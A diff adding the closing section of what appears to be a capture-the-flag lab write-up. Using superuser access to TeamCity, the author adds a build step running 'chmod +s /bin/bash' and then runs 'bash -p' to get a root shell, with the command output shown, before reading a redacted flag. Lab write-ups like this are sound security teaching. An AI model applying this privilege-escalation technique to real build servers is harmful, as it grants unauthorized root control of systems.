@@ -490,3 +490,30 @@ TeamCity is running in professional mode
 
 <img width="1067" height="485" alt="image" src="https://github.com/user-attachments/assets/012b4bfd-edb9-487b-953e-3caa066d0ff9" />
 
+So, we can create projects and stuffs as a superuser.
+
+I created a project, following the instructions and under build scripts, I chose command line and in custom scriot added "chmod +s /bin/bash". This we make /bin/bash a SUID and we can become root easily.
+
+<img width="1064" height="820" alt="image" src="https://github.com/user-attachments/assets/64a15725-c639-4d4c-be68-c13b659e3a69" />
+
+Run the build, it will take some time. After the build success, check if our command got executed.
+
+```bash
+sys-internal@ip-10-48-171-5:~$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+```
+
+Our command ran successfully, now we can escalate to root.
+
+```bash
+sys-internal@ip-10-48-171-5:~$ /bin/bash -p
+bash-5.0# id
+uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
+```
+
+Let's read our final flag and complete this challenge.
+
+```bash
+bash-5.0# cat root.txt
+THM{e8.....bd}
+```
